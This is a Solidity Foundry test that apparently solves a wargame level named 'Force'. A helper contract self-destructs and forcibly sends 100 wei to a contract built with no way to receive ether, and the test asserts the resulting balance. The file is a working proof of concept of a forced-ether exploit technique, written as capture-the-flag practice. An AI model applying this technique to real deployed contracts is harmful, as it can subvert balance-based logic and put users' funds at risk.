// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Force} from "../src/7.Force.sol";

contract Hack {
  receive() external payable {}
  function destory(address payable benificary) external {
    selfdestruct(benificary);
  }
}

contract ForceHackTest is Test{
  address force;
  Hack hackContract;
  function setUp() public {
    force = address(new Force());
    hackContract = new Hack();
  }
  function hack() internal {
    address(hackContract).call{value:100}("");
    hackContract.destory(payable(force));
  }
  function testForceHack() public {
    hack();
    console.log("force.balance", force.balance);
    assertEq(force.balance, 100);
  }
}